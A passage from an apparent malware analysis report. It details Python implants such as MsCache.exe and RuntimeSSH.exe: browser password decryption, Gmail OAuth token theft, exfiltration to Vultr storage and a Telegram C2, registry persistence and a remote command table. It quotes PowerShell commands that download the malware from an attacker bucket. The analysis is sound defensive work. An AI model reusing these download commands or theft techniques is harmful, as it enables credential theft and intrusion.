%ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\0TelStore*.Dat\n                         •   Sends message to C2 if the above actions raised an exception\n            proc_List    •   Runs the psutil.process_iter() command and writes encrypted results to an\n                             obfuscated file name by calling MyName() and passing string, PL\n                         •   File name is renamed to\n                             %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\PL*.Dat\n                         •   Sends message to C2 if the above actions raised an exception\n               sysinf    •   Runs the systeminfo command and writes encrypted results to an obfuscated\n                             file name by calling MyName() and passing string, SI\n                         •   File name is renamed to\n                             %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\Si*.Dat\n                         •   Sends message to C2 if the above actions raised an exception\n               TelGet    •   Obtains a list of all Telegram installation directories if string, All, was passed in\n                         •   Obtains path to Telegram Desktop installation directory if string, Def, was\n                             passed in\n                         •   Compresses Windows Store version of Telegram if it exists\n                         •   For every Telegram installation directory found, compresses the directory and\n                             adds it to an archive at %LOCALAPPDATA%\\TelPath.txt"
+ },
+ {
+  "id": "p61",
+  "text": "•   Renames temporary archive file to\n                         %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\0Tel*.Dat\n                     •   A loop to ignore directories defined by the configuration file is included\n                     •   Sends message to C2 if the above actions raised an exception\n      ProgramGet     •   Concatenates a string of software name, version, and publisher for every\n                         software in windows_tools.installed_software.get_installed_software()\n                     •   Creates an obfuscated name for a file using string, IP, to start the obfuscation\n                         process using function, MyName()\n                     •   Encrypts string of software and writes it to a temporary file in a temporary\n                         directory with a .DAT extension\n                     •   Renames the file to\n                         %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\IP*.Dat\n                     •   Sends message to C2 if the above actions raised an exception\n checkIfProcRann     •   Checks process list for a process name\n                     •   Returns True if the process name is found\n                     •   Return False per psutil.NoSuchProcess, psutil.AccessDenied, or\n                         psutil.ZombieProcess\n                     •   Sends message to C2 if the above action raised an exception\n       ChromGet      •   Compresses content from %LOCALAPPDATA%\\Google\\Chrome\\User\n                         Data\\Default to\n                         %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\1Chr*.Dat\n                     •   Sends message to C2 if the above action raised an exception\n          EdgGet     •   Compresses content from %LOCALAPPDATA%\\Microsoft\\Edge\\User\n                         Data\\Default to\n                         %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\1Edg*.Dat\n                     •   Sends message to C2 if the above action raised an exception\n          MozGet     •   Compresses content from %APPDATA%\\Mozilla\\Firefox\\Profiles to\n                         %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\1Moz*.Dat\n                     •   Sends message to C2 if the above action raised an exception\n            unzip    •   Uses Python zipfile module to extract all files from a zip archive\ncreate_config_file   •   Creates encrypted configuration file,\n                         %ALLUSERSPROFILE%\\ZlibDate\\Settings\\config.xml\n                     •   Sends message to C2 if the above action raised an exception\n  read_config_file   •   Decrypts configuration file\n                     •   Gets a value by token (key)\n                     •   Sends a message to C2 if the above actions raise an exception\nchange_config_file   •   Decrypts configuration file\n                     •   Sets token (key) with value within configuration file\n                     •   Encrypts configuration file\n                     •   Sends message to C2 if the above actions raised an exception\n           set_reg   •   Sets persistence registry key at\n                         SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to the passed in\n                         executable path\n                     •   Returns true of sends a message to C2 if the above actions raised an\n                         exception"
+ },
+ {
+  "id": "p62",
+  "text": "RSC     •   Executes script within Python\n                     •   Stores result in %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\rsc.Dat\n                     •   Sends message to the C2 with the result\n                     •   Sends message to the C2 if the above actions raised an exception\n          RunExe     •   Runs executable from given path\n                     •   Checks if executable is running and sends a message to C2 accordingly\n CheckForDevices     •   Checks for removable logical drives\n                     •   Copies data from drives to\n                         %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\Files\\\n                     •   Sends message to C2 whether the above actions were successful\nZipChromeTelWhat     •   Compresses files from two given directories and a flag\n                     •   If the flag is ChromWhats or MyWhatsapp, the resulting archive name will\n                         reflect IndexedDB\\https_web.whatsapp.com_0.indexeddb.leveldb\n                     •   If the flag is ChromTel, the resulting archive name will reflect\n                         IndexedDB\\https_web.telegram.org_0.indexeddb.leveldb\n                     •   Resulting compressed file is stored as\n                         %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\Z-*.Dat\nGetMyWhatSesion      •   Compresses cache from C:\\ProgramData\\Drivers\\Whatsapp\\User\n                         Data\\EBWebView\\Default\\IndexedDB\\https_web.whatsapp.com_0.indexeddb\n                         .leveldb and C:\\ProgramData\\Drivers\\Whatsapp\\User\n                         Data\\EBWebView\\Default\\Local Storage\n                     •   Sends a message on whether the above actions were successful\nGetChromeTelWhat     •   Checks if chrome.exe is running; if so, sends a message to C2\n                     •   For each profile in %LOCALAPPDATA%\\Google\\Chrome\\User Data, checks if\n                         https_web.whatsapp.com_0.indexeddb.leveldb exists and sends a message to\n                         C2 if it does not exist\n                     •   Otherwise calls ZipChromeTelWhat() which compresses local data cache for\n                         each profile while a message is sent to C2 on whether the above actions were\n                         successful\n     run_send_file   •   Checks if %ALLUSERSPROFILE%\\ZlibDate\\Settings\\lfgy.Dat exists; if not, calls\n                         GetListFileForSend()\n                     •   Calls SendFile()\n                     •   Sends message to C2 if any of the above actions raised an exception\nGetListFileForSend   •   Traverses files in returned by ListOFDrive()\n                     •   Appends to a list of file names\n                     •   Sets a buffer size of 73400320 to call myencryptFile() with\n                     •   Sends message to C2 if any of the above actions raised an exception\n         SendFile    •   Uploads unique files to Vultr\n                     •   Updates configuration file SendFile token with 0\n                     •   Sends message to C2 if file transfer was successful\n                     •   Sends message to C2 if it failed to alter configuration file\n  check_s3_status    •   Calls NetTrue()\n                     •   Lists buckets\n                     •   Sends message to C2 whether the above actions were successful\n      GetFolderS3    •   Traverses given path and uploads it to Vultr"
+ },
+ {
+  "id": "p63",
+  "text": "•   Sends a message to C2 whether the above actions were successful\n       EnableMic     •   Checks if C:\\ProgramData\\Drivers\\MicDriver\\MicDriver.exe exists\n                     •   Sends a message to C2 if the above file exists\n                     •   Downloads MicDriver.zip from micbucket Vultr bucket to\n                         %ALLUSERSPROFILE%\\ZlibDate\\CachedFiles\\MicDriver.zip\n                     •   Makes directory C:\\ProgramData\\Drivers\\MicDriver\n                     •   Uncompresses MicDriver.zip\n                     •   Sets MicDriver registry value C:\\ProgramData\\Drivers\\MicDriver\\MicDriver.exe\n                         within HKCU\n                     •   Runs C:\\ProgramData\\Drivers\\MicDriver\\MicDriver.exe\n                     •   Sends message to C2 whether the above actions were successful\nWhatsappCheker       •   Traverses %LOCALAPPDATA%\\Packages for WhatsAppDesktop in directory\n                         name\n                     •   Depending on value passed in flag, kills process, whatsapp.exe\n                     •   Removes LocalState from the directory that the first search hits on\n                     •   Kills process, whatsapp.exe\n                     •   Runs C:\\ProgramData\\Drivers\\Whatsapp\\WhatssApp.exe\n    MyWhatsapp       •   Checks if C:\\ProgramData\\Drivers\\Whatsapp\\WhatssApp.exe exists and\n                         sends message to C2 if it does\n                     •   Makes directory C:\\ProgramData\\Drivers\\Whatsapp if the above path does not\n                         exist\n                     •   Downloads WebView2Loader.dll to\n                         C:\\ProgramData\\Drivers\\Whatsapp\\WebView2Loader.dll\n                     •   Downloads WhatssApp.exe to\n                         C:\\ProgramData\\Drivers\\Whatsapp\\WhatssApp.exe\n                     •   Kills process, whatsapp.exe\n                     •   Runs Whatssapp.exe\n                     •   Sends message to C2 whether the above actions were successful\n  outlook_extract    •   Creates directory for email exfiltration at\n                         %ALLUSERSPROFILES%\\ZlibDate\\CachedFiles\\mails\n                         Checks if %ALLUSERSPROFILES%\\ZlibDate\\Settings\\b3f8c29e-d670-43d8-\n                         846f-29d5a5f2c3f8 exists and reads a list; if the does not exist, the list is set to\n                         an empty list\n                     •   Writes emails to the above directory\n                     •   Compresses files in directory with the name pattern,\n                         %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\OU*.zip\n                     •   Removes initial exfiltrated directory tree\nextract_msg_data     •   Provides logic to read email content and write content to file system\n (outlook_extract)\n   extract_outlook   •   Extracts Outlook Inbox, Deleted Items, Sent Items, Archive, and Junk Email\n (outlook_extract)       emails to a provided directory\n     extract_gmail   •   Extracts Gmail Inbox emails to a provided directory\n (outlook_extract)\n          NetCHK     •   Sends GET request to https://www.google.com and returns True\n                     •   Otherwise returns False"
+ },
+ {
+  "id": "p64",
+  "text": "NetTrue    •   Sends GET request to https://www.google.com\n                             •   Otherwise waits 5 seconds upon raised exception\n         GetChromePass       •   Decrypts and exfiltrates Chrome passwords\nget_chrome_encryption_k      •   Reads %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State for key\n                     ey          information\n       (GetChromePass)       •   Uses win32crypt.CryptUnprotectData to decrypt key\n       decrypt_password      •   Decrypted encrypted password using key via AES-GCM decryption routine\n       (GetChromePass)\nbackup_chrome_passwor        •   Obtains key via get_chrome_encryption_key()\n                     ds      •   Relatively copies %LOCALAPPDATA%\\Google\\Chrome\\User\n       (GetChromePass)           Data\\Default\\Login Data as ChromePasswordsBackup.db\n                             •   Traverses credentials\n                             •   Decrypts password using obtained key\n                             •   File, chrome_passwords.json, is created to store decrypted credentials\n                             •   File is sent to C2\n             GetFilePhone    •   Checks for USB devices\n                             •   Discovers directories and files\n                             •   Reads and transfers files while maintaining its original directory structure\n            download_file    •   Opens data stream to read file\n           (GetFilePhone)    •   Each byte of stream is appended to a buffer\n      walk (GetFilePhone)    •   Generator to traverse directories and files for PortableDeviceContent\n              _ls_devices    •   Returns devices exposed via Media Transfer Protocol (MTP)\n           (GetFilePhone)\n           _start_to_fetch   •   Checks for USB devices\n           (GetFilePhone)    •   Enumerates any exposed storage media\n                             •   Starts file transfer\n                  KeyLog     •   Returns None; in other words, not implemented\n             SugWhatsapp     •   Sends message if C:\\ProgramData\\Drivers\\Whatsapp\\WhatssApp.exe exists\n                             •   Otherwise, downloads it using S3Client object\n                             •   Assigns WhatsApp short to new download"
+ },
+ {
+  "id": "p65",
+  "text": "MsCache.exe\n      File   PE32+ executable (GUI) x86-64, for MS Windows\n    MD5      3E7A2FCEF1D038D05B20148C573A6499\n   SHA1      F3714C325A39EEA3534CE100881FF55D91AA84E3\n SHA256      4908C0BC11A933D83C83935D9468BA8D08BC23529E5FF4D4344D4F0787B84BB6\nCompiler     Microsoft Visual C/C++(2022+)[-]\n   Linker    Microsoft Linker(14.38**)[GUI64]\n  Packer     PyInstaller(-)[-]"
+ },
+ {
+  "id": "p66",
+  "text": "Behavioral Analysis\nFrom a victim machine the following commands were run.\n       powershell Invoke-WebRequest -Uri\n       https://micbucket.ams1.vultrobjects.com/MSCache.exe -OutFile\n       C:\\ProgramData\\ZlibDate\\cachedfiles\\MSCache.exe\n       powershell Invoke-WebRequest -Uri\n       https://micbucket.ams1.vultrobjects.com/credentials.json -OutFile\n       C:\\ProgramData\\ZlibDate\\cachedfiles\\credentials.json"
+ },
+ {
+  "id": "p67",
+  "text": "Malware sample, MsCache.exe, checked for Chrome browser profiles in\n%LOCALAPPDATA%\\Google\\Chrome\\User Data\\ then checked for keepass.exe within each\nprofile and, if not found, checked SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App. For each\nexisting profile, an Oauth2 connection to https://mail.google.com/ using credentials.json was\nmade. The email and credentials were saved to\nC:\\ProgramData\\ZlibDate\\CachedFiles\\<email>.pickle. While connected, MsCache.exe recorded\nthe data of each email in the mailbox. Upon analyzing one of the pickle files while it was staged or\ncached, the pickle file contented a google.oauth2.credentials.Credentials object. When the\ncontent of the object is queried, the following keys appear with associated values."
+ },
+ {
+  "id": "p68",
+  "text": "• token\n   • refresh_token\n   • token_uri\n   • client_id\n   • client_secret\n   • scopes\n   • expiry\nData is exfiltrated to https://api.telegram.org/. Error messages were written to\nC:\\ProgramData\\ZlibDate\\CachedFiles\\er.txt. Lastly, the data in\n%LOCALAPPDATA%\\Google\\Chrome\\User Data\\ was deleted."
+ },
+ {
+  "id": "p69",
+  "text": "Static Analysis"
+ },
+ {
+  "id": "p70",
+  "text": "Malware sample, MsCache.exe, performs authorization, acquiring, and exfiltrating OAtuh\nauthentication tokens for Gmail accounts and corresponding email addresses. Victim credentials\nare sent to the actor’s Telegram C2. With the use of a legitimate copy of Google’s\nchromedriver.exe (MD5: a0ef15a941f85b4610e674c02d3c4843), malware sample, MsCache.exe,\nfacilitates the authorization token acquisition process."
+ },
+ {
+  "id": "p71",
+  "text": "Upon decompiling MsCache.exe, the Python 3.12 file, main.py resulted. Python file, main.py,\ncontained the following imports."
+ },
+ {
+  "id": "p72",
+  "text": "•   pickle\n   •   os\n   •   requests\n   •   socket\n   •   shutil\n   •   pathlib\n   •   selenium\n   •   google_auth_oauthlib.flow\n   •   uuid\n   •   time"
+ },
+ {
+  "id": "p73",
+  "text": "Python file, main.py contained the following global variables which were used by functions further\ndescribed below.\n       SCOPES = [\n        'https://mail.google.com/']\n       USER_DATA_PATH =\n       Path(f'''{os.environ['LOCALAPPDATA']}\\\\Google\\\\Chrome\\\\Settings\\\\User Data''')\n       RESULT_FILES_ROOT = 'C:\\\\ProgramData\\\\ZlibDate\\\\CachedFiles\\\\'\n       fetched_mails = []"
+ },
+ {
+  "id": "p74",
+  "text": "Python file, main.py, contained the following functions."
+ },
+ {
+  "id": "p75",
+  "text": "Function      Description\n         copy_user_data        • Checks if %LOCALAPPDATA%\\Google\\Chrome\\Settings\\User Data\n                                   is valid and removes it\n                               • Copies structure of %LOCALAPPDATA%\\Google\\Chrome\\User Data\n                                   to %LOCALAPPDATA%\\Google\\Chrome\\Settings\\User Data\n                               • Calls send_log() if the above actions raised an exception\n                send_log       • Sends message as a POST request to api.telegram.org, and wrote\n                                   the message to C:\\ProgramData\\ZlibDate\\CachedFiles\\er.txt\n            send_session       • Reads C:\\ProgramData\\ZlibDate\\CachedFiles\\<email>.pickle via\n                                   bytes\n                               • Sends a POST request with the bytes to api.telegram.org\n                               • Deletes the pickle file\n                               • Calls send_log() if the above actions raised an exception\n              get_access       • Uses Chrome WebDriver and user profile as parameters to obtain\n                                   credentials per email\n                               • WebDriverWait object blocks sequential logic for 30 seconds or\n                                   until a DOM object, div[data-email], is available\n                               • If an exception is raised at this point, send_log(), is called\n                               • Emails within DOM object, div[data-email], is stored in local\n                                   variable\n                               • A loop checks each email object against global variable,\n                                   fetched_mails, initially an empty list\n                               • If an email match occurs, an index is incremented by 1 while\n                                   continuing the loop otherwise a flag is set to True and loop exited\n                               • If the flag is False, False and None values are returned to indicate\n                                   no emails nor credentials were to be returned\n                               • If the flag is True, the Python function, sleep(), is called for 10\n                                   seconds and the Selemium function, click(), is called on the email\n                                   index which initiated the Oauth flow process\n                               • A WebDriverWait object blocks sequential logic for 30 seconds or\n                                   until the current URL contains the substring warning, authError,\n                                   deniedsigninrejected, or challenge; these substrings indicate that\n                                   the route blocked automation which resulted in function,\n                                   send_log(), being called\n                               • If the route was not blocked, the email and credentials are returned\n                                   via Selenium\n                               • Calls send_log() if the above actions raised an exception\nauthenticate_with_seleniu      • Obtains a list of profiles within\n                       m           %LOCALAPPDATA%\\Google\\Chrome\\Settings\\User Data\n                               • For each profile, a new Chrome WebDriver was created using\n                                   headless mode; the user-agent string, Mozilla/5.0 (Windows NT\n                                   10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\n                                   Chrome/123.0.0.0 Safari/537.36, overwrote the default user-agent\n                                   string\n                               • Establishes an InstalledAppFlow object that reads\n                                   C:\\ProgramData\\ZlibDate\\CachedFiles\\credentials.json and uses"
+ },
+ {
+  "id": "p76",
+  "text": "SCOPES as a parameter which contains the Gmail URL,\n                                  https://mail.google.com/, in a list; the resulting behavior of these\n                                  actions is a configured OAuth authentication with actor supplied\n                                  credentials which is used to interact with victims’ Gmail accounts\n                              •   The InstalledAppFlow object then runs a local server using the\n                                  Chrome WebDriver and the get_access() function as parameters\n                                  which returns two objects: an email and credentials\n                              •   If no email is returned, Chrome WebDriver session is terminated\n                              •   If there are credentials, this content is stored in\n                                  C:\\ProgramData\\ZlibDate\\CachedFiles\\<email>.pickle, then passes\n                                  into function, send_session(), and the email is added to the global\n                                  variable, fetched_mails\n                              •   The Python function, sleep(), is called for five seconds\n                              •   Calls send_log() if the above actions raised an exception\n                     main     •   Called in the Python name-main idiom\n                              •   Calls copy_user_data()\n                              •   Calls authenticate_with_selenium()\n                              •   Calls send_log() if the above actions raised an exception"
+ },
+ {
+  "id": "p77",
+  "text": "External Resource: chromedriver.exe\n     File    PE32+ executable (console) x86-64, for MS Windows\n     MD5     A0EF15A941F85B4610E674C02D3C4843\n    SHA1     47053183316B2D9A6A409729801BE05BB81E216C\n  SHA256     609667EEE9C70DE0E530E89CFB2880646CE3141439E4A9482FB4F09AC987233E\n Compiler    Microsoft Visual C/C++(2015 v.14.0)[-]\n   Linker    Microsoft Linker(14.0)[Console64,console]"
+ },
+ {
+  "id": "p78",
+  "text": "This binary is a legitimate file from Google for testing programmatic bridges between automation\nframeworks (i.e.: Selenium) and the Google Chrome browser."
+ },
+ {
+  "id": "p79",
+  "text": "RuntimeSSH.exe\n      File   PE32+ executable (GUI) x86-64, for MS Windows\n     MD5     E51FF37FB431767DCDEC0B5E6D2A786A\n    SHA1     87DCBA4957396A9E594ED1D133BC115315763002\n  SHA256     0D74156089292EEE308017C8E8A7550739ECB6149FF379810F7C54B1DBAABC91\n Compiler    Microsoft Visual C/C++(2022 v.17.4)[-]\n   Linker    Microsoft Linker(14.34**)[GUI64]"
+ },
+ {
+  "id": "p80",
+  "text": "Packer    PyInstaller(-)[-]"
+ },
+ {
+  "id": "p81",
+  "text": "File   PE32+ executable (GUI) x86-64, for MS Windows\n     MD5     EBDD9595B79B39F53909D862499DBC94\n    SHA1     9A73B561AE4CAEF2F445D0272389971BC8A45D6F\n  SHA256     97C9E2CBE728153A350A280CACA6ED38F650014F6D1821B7764AFF4704FE12D9\n Compiler    Microsoft Visual C/C++(2022 v.17.4)[-]\n    Linker   Microsoft Linker(14.34**)[GUI64]\n   Packer    PyInstaller(-)[-]"
+ },
+ {
+  "id": "p82",
+  "text": "Behavioral Analysis\nMalware sample, RuntimeSSH.exe, was initially observed compressed within Runtime_SSH.zip\non the victim’s machine with relative content like in Figure 3. For example, file, rantom.txt (MD5:\n7D3CCE1F9DBAED585B61E6E903D69B9B), was compressed as well. Runtime_SSH.zip was\nuncompressed to directory Runtime_SSH\\."
+ },
+ {
+  "id": "p83",
+  "text": "Upon executing RuntimeSSH.exe, the following file writes occurred.\n       %USERPROFILE%\\AppData\\Local\\Temp\\by0dk2bw\n       %USERPROFILE%\\AppData\\Roaming\\Config\\config.xml"
+ },
+ {
+  "id": "p84",
+  "text": "Periodic POST requests were made to https://api.telegram.org/."
+ },
+ {
+  "id": "p85",
+  "text": "Static Analysis\nUpon decompiling RuntimeSSH.exe, the Python 3.11 file, main.py, resulted. Python file, main.py,\ncontained the following imports."
+ },
+ {
+  "id": "p86",
+  "text": "•   logging"
+ },
+ {
+  "id": "p87",
+  "text": "•   asyncio"
+ },
+ {
+  "id": "p88",
+  "text": "•   time"
+ },
+ {
+  "id": "p89",
+  "text": "•   sys"
+ },
+ {
+  "id": "p90",
+  "text": "•   io"
+ },
+ {
+  "id": "p91",
+  "text": "•   re"
+ },
+ {
+  "id": "p92",
+  "text": "•   requests"
+ },
+ {
+  "id": "p93",
+  "text": "•   telegram"
+ },
+ {
+  "id": "p94",
+  "text": "•   bot.utils (custom utils.py)"
+ },
+ {
+  "id": "p95",
+  "text": "•   bot.strings (custom strings.py)"
+ },
+ {
+  "id": "p96",
+  "text": "•   system.utils (custom utils.py)"
+ },
+ {
+  "id": "p97",
+  "text": "•   system.constants (custom constants.py)"
+ },
+ {
+  "id": "p98",
+  "text": "Python file, main.py, contains logic to perform the following:"
+ },
+ {
+  "id": "p99",
+  "text": "•   Create mutex, ytyjyujyu\n   •   Gets thread’s last error code and if it is -1, the logic exists\n   •   Create configuration file\n   •   Read Telegram configuration from configuration file\n   •   Obtain machine hostname\n   •   Configuration of Telegram API handler\n   •   Definition of function, analyze_command() which listens for the following string prefixes\n Command      Description\n     @@          • String passed into run_command() which runs logic from rantom.txt\n                 • Sends back “🖨 Command result:\\n\\n`{cmd}`” to C2\n        ##       • String passed into run_builtin_command() and revalued by the next few characters\n         **      • Writes to file C:\\ProgramData\\ur.txt contents of message\n                 • Sends back ‘✅ Message sent successfully’"
+ },
+ {
+  "id": "p100",
+  "text": "•   Function, run_builtin_command(), ran the following C2 commands\n Comman                                             Description\n    d\n      pl        •   Calls get_process_list(), sending the results to C2. The underlying implementation is\n                    prototyped in system\\utils.py and protected in rantom.txt.\n        si      •   Calls get_sys_info(), sending the results to C2. The underlying implementation is\n                    prototyped in system\\utils.py and protected in rantom.txt."
+ },
+ {
+  "id": "p101",
+  "text": "ss      •   Calls get_screenshot(), sending the results back to C2 as a PNG file. The underlying\n                   implementation is prototyped in system\\utils.py and protected in rantom.txt.\n        dt     •   Calls up_tel(), exfiltrating the data collected by this function back to C2 as a ZIP\n                   archive. The underlying implementation is prototyped in system\\utils.py and\n                   protected in rantom.txt.\n       reg     •   Calls make_startup(). The underlying implementation is prototyped in system\\utils.py\n                   and protected in rantom.txt.\n    regtro     •   Calls make_startup() with the tro=True argument. The underlying implementation is\n                   prototyped in system\\utils.py and protected in rantom.txt.\n       cht     •   Provides the capability for the construction of a new telegram.ext.Application\n                   instance with a new Telegram API token and Chat ID provided by the C2 and for\n                   validation of the provided token.\n               •   Proceeds to call the write_config_file() function to modify these values used by the\n                   sample if the change is successful, however, the underlying implementation of this\n                   function is prototyped in system\\utils.py and is protected in rantom.txt. The\n                   send_message_arbitrary() function is called to inform C2 whether the token change\n                   was successful.\n    runtro     •   Calls run_exe(), passing the configuration parameters TRO_EXE_NAME (winappx.exe)\n                   and UNZIP_PATH (%ALLUSERSPROFILE%\\MicrosoftDistribution\\sysmain) to the call.\n                   The fully qualified path\n                   %ALLUSERSPROFILE%\\MicrosoftDistribution\\sysmain\\winappx.exe is effectively\n                   passed to the function call. The underlying implementation is prototyped in\n                   system\\utils.py and protected in rantom.txt.\n    whois      •   Creates a new thread, invoking the Python standard library function requests.get()\n                   with the URL https://api.ipify.org passed as the argument. This URL corresponds to an\n                   API which returns the target machine's IP address.\n               •   A message is sent back to C2 with send_message_arbitrary() (implemented in\n                   bot\\utils.py) either containing the IP address information obtained or noting an error\n                   has occurred.\n runexe<<      •   Calls run_exe(), passing the file path determined by a regex search as an argument.\n                   The underlying implementation is prototyped in system\\utils.py and protected in\n                   rantom.txt."
+ },
+ {
+  "id": "p102",
+  "text": "•   Configuration of communication handler to C2\n   •   Definition of function, downloader()\n   •   Configuration of event loop\n   •   Definition of function, send_initial_message()\n   •   Definition of function, check_for_file()\n   •   Listens for updates from C2 via application.run_polling()"
+ },
+ {
+  "id": "p103",
+  "text": "Python file, main.py, contained the following functions."
+ },
+ {
+  "id": "p104",
+  "text": "Function   Description\n    analyze_command         • Listens for C2 commands that contain the following prefix: @@, ##, or **\n run_builtin_command        • Listens for custom C2 commands\n            downloader      • If file name starts with dev, bit, or kee, and ends .dll, function, place_dll(), is\n                                called from system\\utils.py\n                            • If file name starts with reg and ends with .zip, function, download_file(), is\n                                called from bot\\utils.py after checking for path, C:\\ProgramData\\ssh-cache-\n                                default\\{8bda3848-495e-43f4-8d10-7d37a67f1604}\n                            • If the file ends with .zip, function, download_file(), is called after checking\n                                %APPDATA%\\Config\n send_initial_message       • Calls send_message_arbitrary() from bot\\utils.py in a loop\n                            • Calls function, sleep(), for 10 seconds if an exception is raised\n                            • The loop is terminated once the message is sent successfully\n        check_for_file      • Checks for C:\\ProgramData\\up.txt\n                            • Opens the above file in read-only mode if it exists\n                            • Calls function, send_message_arbitrary(), with content of file\n                            • Deletes file\n                            • Waits for 7 seconds"
+ },
+ {
+  "id": "p105",
+  "text": "Malware sample, RuntimeSSH.exe, relied on two modules, bot and system, both containing\nPython files.\nPython file, bot\\strings.py, contained the following string messages."
+ },
+ {
+  "id": "p106",
+  "text": "msg_user_is_active = '          `{pc_name}` is online now'"
+ },
+ {
+  "id": "p107",
+  "text": "msg_cmd_result = '🖨 Command result:\\n\\n`{cmd}`'"
+ },
+ {
+  "id": "p108",
+  "text": "msg_download_success = '              {file_name} downloaded successfully'"
+ },
+ {
+  "id": "p109",
+  "text": "msg_download_failed = '            {file_name} download failed'"
+ },
+ {
+  "id": "p110",
+  "text": "msg_exe_run_success = '             {file_name} execution was successful'"
+ },
+ {
+  "id": "p111",
+  "text": "msg_exe_run_failed = '          {file_name} execution failed'"
+ },
+ {
+  "id": "p112",
+  "text": "err_unzip = '      {file_name} unzip failed'"
+ },
+ {
+  "id": "p113",
+  "text": "success_unzip = '         {file_name} unzipped successfully'"
+ },
+ {
+  "id": "p114",
+  "text": "success_token_change = ' Token changed successfully\\n\\nBot\\'s new details\n       are:\\n\\n  username: \\n @{bot_username}\\n\\n   token: \\n `{bot_token}`\\n \\n\n       gpid:\\n `{gp_id}`\\n\\nㅤ'"
+ },
+ {
+  "id": "p115",
+  "text": "err_token_change = '         Failed to change token, check if token is valid and try again'"
+ },
+ {
+  "id": "p116",
+  "text": "msg_whois_result = '         Whois result:\\n\\nIP adress is `{resp}`\\nㅤ'"
+ },
+ {
+  "id": "p117",
+  "text": "err_whois = '      Failed to get whois'"
+ },
+ {
+  "id": "p118",
+  "text": "fetch_special_message_success = '             Message sent successfully'"
+ },
+ {
+  "id": "p119",
+  "text": "Python file, utils.py, contained the following functions.\n                    Function     Description\n send_message_markdown_v2           • Sends arbitrary message to C2 using Markdown version 2\n      send_message_arbitrary        • Sends arbitrary message to C2\n        send_as_file_arbitrary      • Sends file to C2\n         send_photo_arbitrary       • Sends photo to C2\n               download_file        • Downloads a file from C2 to a specified destination path\n                                    • Sends a message back to C2 whether it was successful\n                                    • Retries downloading three times if necessary"
+ },
+ {
+  "id": "p120",
+  "text": "Python file, system\\config.py, contained encryption keys, bot identifiers, and directory paths for\nother functions to use."
+ },
+ {
+  "id": "p121",
+  "text": "Python file, system\\constants.py, contained the following global variables and values.\n       ELMNT_TOKEN = 'token'\n       ELMNT_USER_ID = 'userId'\n       ELMNT_SEND_INITIALS = 'sendInitials'"
+ },
+ {
+  "id": "p122",
+  "text": "Python file, system\\mycrypto.py, contained no variation from winappx.exe mycrypto.py."
+ },
+ {
+  "id": "p123",
+  "text": "Python file, system\\utils.py, contained the following functions.\n            Function   Description\n        get_pc_name       • Calls get_pc_name part from rantom.txt\n                          • Returns results"
+ },
+ {
+  "id": "p124",
+  "text": "create_config_file          •   Calls create_config_file from rantom.txt\n                               •   Returns results\n     read_config_file          •   Calls read_config_file part from rantom.txt\n                               •   Returns results\n     write_config_file         •   Calls write_config_file part from rantom.txt\n                               •   Returns results\n     get_process_list          •   Calls get_process_list part from rantom.txt\n                               •   Returns results\n         get_sys_info          •   Calls get_sys_info part from rantom.txt\n                               •   Returns results\n     get_screenshot            •   Calls get_screenshot part from rantom.txt\n                               •   Returns results\n            place_dll          •   Calls place_dll part from rantom.txt\n                               •   Returns results\n                unzip          •   Calls unzip part from rantom.txt\n                               •   Returns results\n       make_startup            •   Calls make_startup part from rantom.txt\n                               •   Returns results\n               up_tel          •   Calls up_tel part from rantom.txt\n                               •   Returns results\n      run_command              •   Calls run_command part from rantom.txt\n                               •   Returns results\n             run_exe           •   Calls run_exe part from rantom.txt\n                               •   Calls get_process_list()\n                               •   Sends a message whether a passed in argument is within the process list\n get_method_content            •   Decrypts rantom.txt\n                               •   Splits the contents of the decrypted rantom.txt\n                               •   Returns the part where the passed in method name matches which can be\n                                   used to pass in Python function, exec()"
+ },
+ {
+  "id": "p125",
+  "text": "Python file, system\\winstructures.py, contained references WINAPI. Python file,\nsystem\\winstructures.py, contained the following function.\n          Function       Description\n get_process_name           • Returns executable path for the passed in handle to a process using function,\n                                QueryFullProcessImageNameW()"
+ },
+ {
+  "id": "p126",
+  "text": "Decrypted file, rantom.txt, contained the following part logic when file is split.\n              Part       Description\n create_config_file         • Defines function, inner()"
+ },
+ {
+  "id": "p127",
+  "text": "inner    •   Check if %APPDATA%\\Config exists; if not, creates directory\n(create_config_file   •   Checks if %APPDATA%\\Config\\config.xml exists; if so, returns\n                  )   •   Calls mycrypto.myencryptFile() which writes out an encrypted\n                          %APPDATA%\\Config\\config.xml\n  read_config_file    •   Decrypts %APPDATA%\\Config\\config.xml via calling\n                          mycrypto.mydecryptFile()\n                      •   Gets a configuration item from the XML structure\n  write_config_file   •   Decrypts %APPDATA%\\Config\\config.xml\n                      •   Writes a configuration item to decrypted XML structure\n                      •   Encrypts the XML structure\n                      •   Writes encrypted data to %APPDATA%\\Config\\config.xml\n     get_pc_name      •   Returns machine’s hostname\n  get_process_list    •   Returns machine’s process list\n      get_sys_info    •   Runs subprocess to obtain the result of command, systeminfo\n   get_screenshot     •   Gets a screenshot\n         place_dll    •   Defines functions, hide_console() and inner()\n                      •   Uses imports system, os, asyncio, and bot.utils\n     hide_console     •   Creates a shell for payload that is passed in while hiding the executing\n        (place_dll)       console\n  inner (place_dll)   •   Creates directories “C:\\Windows ” and “C:\\Windows \\SysWOW64”\n                      •   Copies bthudtask.exe to “C:\\Windows \\SysWOW64\\”\n                      •   Downloads a file from C2\n                      •   Deletes directories if the above actions raised an exception\n             unzip    •   Uncompresses archive\n                      •   Deletes archive\n   run_command        •   Runs command and saves the output\n         run_exe      •   Creates a shell for payload that is passed in while hiding the executing\n                          console\n                      •   This logic is wrapped in a try-except block\n            